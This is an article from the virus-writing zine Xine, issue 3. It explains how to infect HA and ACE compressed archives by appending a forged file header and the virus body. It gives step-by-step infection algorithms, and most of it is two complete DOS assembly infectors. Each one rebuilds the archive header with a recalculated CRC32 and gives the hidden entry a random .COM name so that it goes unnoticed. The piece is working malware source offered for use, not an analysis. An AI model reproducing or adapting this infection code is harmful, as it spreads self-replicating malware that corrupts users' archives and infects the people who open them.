   ;
   ;                                         /-----------------------------\
   ;                                         | Xine - issue #3 - Phile 111 |
   ;                                         \-----------------------------/
   ;
   ;
   ;
   ;                                 Dropping over
   ;                    Compression alternative format : HA & ACE
   ;                         By UnknowN MnemomaniaK [iKx]
   ;
   ;
   ;   Introduction to HA
   ;  +------------------+
   ;
   ;  Ha is an a bit  old   compression format   , it   was thought to work  with
   ;  compatibitility from linux to ibm dos , obviously it is not really used , I
   ;  have never seen any HA but the archive exists, so I decided to code it into
   ;  my infectors series  in honor of the Zhengxi virus ,  then let's see how it
   ;  works.
   ;
   ;   HA Format
   ;  +---------+
   ;
   ;  The Ha structure is simple like rar structure but has a little  difficulty,
   ;  Ha archive is fragmented in two zones
   ;
   ;  The little that has just :     db      'HA'            Ha mark
   ;                                 dw      0               number of archive
   ;
   ;  and following this part , there are a lot of archives that all must respect
   ;  this header
   ;
   ; OFFSET LABEL       TYPE VALUE        DESCRIPTION
   ; ------ ----------- ---- ----------- ----------------------------------
   ; 00     VERCOMP     DB   0           compression method & ver need
   ;
   ;         value: 0 = 'CPY' Stored             2 = 'HSC' compress using a [sic?]
   ;                1 = 'ASC' Default compress. 14 = 'DIR' Directory entry
   ;                15 = 'SPECIAL' Unknwon (ver 0.99B)
   ;
   ; 01     COMPRESS    HEX  00000000    compressed size
   ; 05     ORIG        HEX  00000000    original size
   ; 09     CRC32       HEX  00000000    Crc32
   ; 0D     DATEHOUR    HEX  00000000    File-time Unix Standard
   ; ??     PATHNAME    DS   ?           Pathname
   ; ??     SEPARATOR   DB   0FF         Separator equal to 0FFh
   ; ??     FILENAME    DS   ?           Filename
   ; ??     SPEC        DB   1           Machine spec
   ;
   ;         Value:  0 = MS DOS
   ;                 1 = Linux
   ;
   ; ??      INFO       DW   2           Information - Usually File Attributes
   ;
   ;   Infection
   ;  +---------+
   ;
   ;  The HA file infection is quite simple , you have to verify that the first 2
   ;  bytes are equal to HA ,  increment the word at offset 02h in the file by 1,
   ;  read  0Dh bytes , go to the  end write it , write No  Pathname + Filename ,
   ;  write spec and close the file , damn , let's build an algorithm
   ;
   ;         1ø Read 4 bytes
   ;         2ø Verify the 2 first bytes , if <> HA then close file
   ;         3ø Inc the word at offset 02h
   ;         4ø Read 0Dh
   ;         5ø Rebuild the CRC32 & the name , (-> rebuild header)
   ;         6ø Go to the end
   ;         7ø Write the virus
   ;         8ø Close the file
   ;
   ;  The Asm file are under the ACE infection, if you need code , don't hesitate
   ;
   ;   Introduction to ACE
   ;  +-------------------+
   ;
   ;  ACE format is a quite new format that has basically the same structure than
   ;  RAR , ACE is a serious archive build by an independent , some razor warez
   ;  issue of  razor  are  know  under  this  file  format .  Ace compression/
   ;  decompression software is quite good looking and you have very soon the
   ;  impression that you have to do with professional material.
   ;
   ;   ACE Format
   ;  +----------+
   ;
   ;  I'll just detail the format of one header only becoz you just need to drop
   ;  it and drop the virus to infect an archive
   ;
   ; OFFSET LABEL       TYP  VALUE        DESCRIPTION
   ; ------ ----------- ---- ----------- ----------------------------------
   ; 00     HEADCRC     DW   0000        CRC32x of the header(from 04 to 04+w,[02])
   ; 02     HEADSIZ     DW   0000        Size of the header
   ; 04     HEADTYPE    DB   0           Header type : 01 equal files
   ; 05     HEAD-FLAGS  DW   0           Header : 8001h equal no problem flags :]
   ; 07     COMPRESS    HEX  00000000    Compressed size
   ; 0B     ORIG        HEX  00000000    Original size
   ; 0F     FILE TIME   HEX  00000000    File time
   ; 13     FILE ATTRIB HEX  00000000    Considered as a DWORD,but a WORD is Used
   ; 17     CRC32x      HEX  00000000    CRC32x of the file
   ; 18     INFOS       HEX  00000000    Unknown ( Unused ? )
   ; 1B     RESERVED    DW   0000        Use a existing one
   ; 1F     FILENAMESIZ DW   0000        Unknown ( Unused ? )
   ; ??     FILENAME    DS               NameFile
   ;
   ;  Ace structure is kinda secret because  not too used and not reprogrammed by
   ;  a lot of people like rar arj or zip , but by one individual person only
   ;
   ;  What's the CRC32x ? then it's basically the CRC32 who are applying a second
   ;  not. It's because the programmer forgot to put that in his CRC routine
   ;
   ;   Infection
   ;  +---------+
   ;
   ;  So , I consider  that  the best   solution with  ace files is to drop  one
   ;  header from an existing  packet in  the archive , then you  go to  the end,
   ;  you rebuild the header , you calculate Header CRC , you drop the header and
   ;
   ;         1ø Go to the end
   ;         2ø Rebuild the header
   ;         3ø Write the header
   ;         4ø Write the virus
   ;         5ø Close tha file
   ;
   ;  But in the example, I have analysed the complex ACE header structure to get
   ;  an existing one  header as temporary  , let's see how I did that if you are
   ;  interested with that
   ;
   ;
   ; - - - HA Infector ( test it with the appropried name file ) - - - - - - - - -

   .model tiny
   .code
   .286

   org 100h

   start:

   mov ax,3d02h                                            ; open HA file
   mov dx,offset name1
   int 21h
   xchg ax,bx

   mov ah,3fh                                              ; read first 256 byte
   mov cx,256
   mov dx,offset temporary1
   int 21h

   cmp word ptr [temporary1],'AH'                          ; test if archive is
   jne HA_invalid                                          ; a real ha

   inc word ptr [temporary1+2]                             ; increment
                                                           ; number of archive
   mov al,2
   call go                                                 ; go to the end

   call HA_build                                          ; rebuild an HA header

   mov ah,40h
   mov dx,offset temporary1+4
   int 21h                                               ; write the new header

   mov ah,40h
   mov cx,fin-start
   mov dx,offset start
   int 21h                                                 ; write the virus

   xor ax,ax
   call go

   mov ah,40h
   mov cx,4
   mov dx,offset temporary1
   int 21h                                                 ; write the new 1st
                                                           ; packet
   HA_invalid:

   mov ah,3Eh
   int 21h                                                 ; close the file

   ret

   HA_build:

   mov bp,offset temporary1+4
   mov byte ptr [bp],20h                      ; set to no compression & version

   inc bp
   mov word ptr [bp],fin-start                ; set 01h = file size
   mov word ptr [bp+2],0

   add bp,4
   mov cx,fin-start
   mov word ptr [bp],cx                       ; set 05h = file size too
   mov word ptr [bp+2],0
   add bp,4

   mov si,offset start

   push bp
   call crc_calc
   pop bp

   mov word ptr [bp],cx                       ; set 09h as CRC32 of the file
   mov word ptr [bp+2],dx

   add bp,8

   mov byte ptr [bp],0                        ; set no path name
   inc bp

   call set_a_name                            ; set a new name

   mov di,bp
   add bp,cx
   mov si,offset betaname

   repz movsb                                 ; copy it

   mov cx,bp
   sub cx,offset temporary1+1

   mov word ptr [bp],0102h                    ; write machine infos ...
   mov byte ptr [bp+2],20h

   ret                                        ; return with header size in cx

   set_a_name:

   mov ah,2Ch                                ; make aleatory a new name
   int 21h

   and cx,0000111100001111b
   and dx,0000111100001111b

   add cx,4141h
   add dx,4141h
   mov word ptr [betaname],cx
   mov word ptr [betaname+2],dx
   mov word ptr [betaname+4],'C.'
   mov word ptr [betaname+6],'MO'
   mov word ptr [betaname+8],0

   mov cx,9

   ret

   go:                                                     ; File seek

   mov ah,42h
   xor cx,cx
   xor dx,dx
   int 21h

   ret

   crc_calc:

   push bx
   push si cx

   call crc_table                          ; calculate crc table

   pop cx si

   mov bp,cx

   mov cx,0ffffh
   mov dx,0ffffh

   xor ax,ax

   Crc_loop:

   lodsb
   mov bx,ax
   xor bl,cl
   mov cl,ch
   mov ch,dl
   mov dl,dh
   mov dh,bh
   shl bx,1
   shl bx,1
   xor cx,word ptr [bx+di]
   xor dx,word ptr [bx+di+02]
   dec bp

   jnz Crc_loop

   not dx
   not cx

   pop bx
   ret

   crc_table:

   mov    di,offset starttable+1024    ; the buffer table
                       ; remember : It begin by the end
   mov    bp,255               ; set bp equal 255
                       ; 255 * 4 = 1024
   std                 ; set Direction Flag On

   TableHighloop:              ; the major loop in the Crc table Calc

   mov cx,8                ; set the minus loop to 8
   mov dx,bp               ; dx = bp , major counter loop
   xor     ax,ax               ; ax = zero

   TableLowLoop:

   shr    ax,1             ; mov one byte of ax at right in bin
   rcr    dx,1                             ; if anything lost , put it on dx

   jae    anomality                        ; if above or equal skip encrypt.

   xor    dx,08320h            ; encrypt value by a signature
   xor    ax,0EDB8h            ;

   anomality:

   loop   TableLowLoop         ; make it 8 times

   stosw                   ; write ax
   xchg   dx,ax
   stosw                   ; not write dx
   dec    bp               ; decrement the counter

   jnz TableHighLoop           ; repeat it until bp = 0

   mov word ptr [di],0         ; last value equal 0
   sub di,2
   mov word ptr [di],0
   cld                 ; clear direction flag

   ret

   name1:  db 'yeye.ha',0

   fin:

   betaname:   db 13 dup (?)

   starttable: db 1024 dup (?)

           db 2 dup (?)

   temporary1: db 256 dup (?)

   end start

   - - - HA Infector - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

   - - - ACE Infector ( test it with the appropried name file )- - - - - - - - -

   .model tiny
   .code
   .286

   org 100h

   start:

   mov ax,3d02h
   mov dx,offset name1
   int 21h                                         ; open filename
   xchg ax,bx

   mov ah,3fh
   mov cx,4
   mov dx,offset temporary1                      ; read 4 first bye put it into
   int 21h                                         ; temporary

   xor cx,cx
   mov dx,word ptr [temporary1+2]                  ; go to offset w,[02h]
   add dx,4
   xor ax,ax
   call gozero

   mov ah,3fh
   mov cx,256
   mov dx,offset temporary1
   int 21h                                         ; read 256 bytes

   call ace_header                                 ; build a new ace_header

   mov al,2
   call go

   mov ah,40h
   mov cx,word ptr [bp+2]
   add cx,4
   mov dx,offset temporary1
   int 21h                                         ; write the header

   mov ah,40h
   mov cx,fin-start
   mov dx,offset start
   int 21h                                         ; write the virus

   ACE_invalid:

   mov ah,3Eh
   int 21h                                         ; close the file

   ret

   ACE_header:

   mov bp,offset temporary1

   mov byte ptr [bp+4],01                          ; set no compression
   mov word ptr [bp+5],8001h                       ; no flags

   mov word ptr [bp+7],fin-start                   ; virus as compress & uncpss
   mov word ptr [bp+7+2],0                         ; size
   mov word ptr [bp+0Bh],fin-start
   mov word ptr [bp+0Bh+2],0

   push bp
   mov si,100h
   mov cx,fin-start
   call crc_calc
   pop bp                                          ; calc crc of the virus

   not dx                                          ; not ( not (ax)) = ax
   not cx

   mov word ptr [bp+17h],cx
   mov word ptr [bp+17h+2],dx                      ; save it here

   call set_a_name                                 ; create new name without
   dec cx                                          ; Zero End
   mov word ptr [bp+1Dh+4],cx                      ; copy file size
   mov word ptr [bp+02],cx
   add word ptr [bp+02],1Fh                        ; copy header size (1Fh+cx)

   lea di,[bp+1Fh+4]
   mov si,offset betaname                          ;

   repz movsb                                      ; copy name

   push bp

   lea si,[bp+4]
   mov cx,word ptr [bp+2]

   call crc_calc                                   ; render header CRC
   pop bp

   not cx
   mov word ptr [bp],cx

   ret

   set_a_name:                                     ; set a new name

   mov ah,2Ch
   int 21h

   and cx,0000111100001111b
   and dx,0000111100001111b

   add cx,4141h
   add dx,4141h
   mov word ptr [betaname],cx
   mov word ptr [betaname+2],dx
   mov word ptr [betaname+4],'C.'
   mov word ptr [betaname+6],'MO'
   mov word ptr [betaname+8],0

   mov cx,9

   ret

   go:

   xor cx,cx
   xor dx,dx

   gozero:
   mov ah,42h
   int 21h

   ret

   crc_calc:

   push bx
   push si cx

   call crc_table                          ; calculate crc table

   pop cx si

   mov bp,cx

   mov cx,0ffffh
   mov dx,0ffffh

   xor ax,ax

   Crc_loop:

   lodsb
   mov bx,ax
   xor bl,cl
   mov cl,ch
   mov ch,dl
   mov dl,dh
   mov dh,bh
   shl bx,1
   shl bx,1
   xor cx,word ptr [bx+di]
   xor dx,word ptr [bx+di+02]
   dec bp

   jnz Crc_loop

   not dx
   not cx

   pop bx
   ret

   crc_table:

   mov    di,offset starttable+1024-2  ; the buffer table
                       ; remember : It begin by the end
   mov    bp,255               ; set bp equal 255
                       ; 255 * 4 = 1024
   std                 ; set Direction Flag On

   TableHighloop:              ; the major loop in the Crc table Calc

   mov cx,8                ; set the minus loop to 8
   mov dx,bp               ; dx = bp , major counter loop
   xor     ax,ax               ; ax = zero

   TableLowLoop:

   shr    ax,1             ; mov one byte of ax at right in bin
   rcr    dx,1             ; if anything losted , put it on dx

   jae    anomality                        ; if above or equal skip encrypt.

   xor    dx,08320h            ; encrypt value by a signature
   xor    ax,0EDB8h            ;

   anomality:

   loop   TableLowLoop         ; make it 8 times

   stosw                   ; write ax
   xchg   dx,ax
   stosw                   ; not write dx
   dec    bp               ; decrement the counter

   jnz TableHighLoop           ; repeat it until bp = 0

   mov word ptr [di],0         ; last value equal 0
   sub di,2
   mov word ptr [di],0
   cld                 ; clear direction flag

   ret


   name1:  db 'yeye.ace',0

   fin:

   betaname:   db 13 dup (?)

   starttable: db 1024 dup (?)

           db 2 dup (?)

   temporary1: db 256 dup (?)

   end start

   ; - - - ACE Infector - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
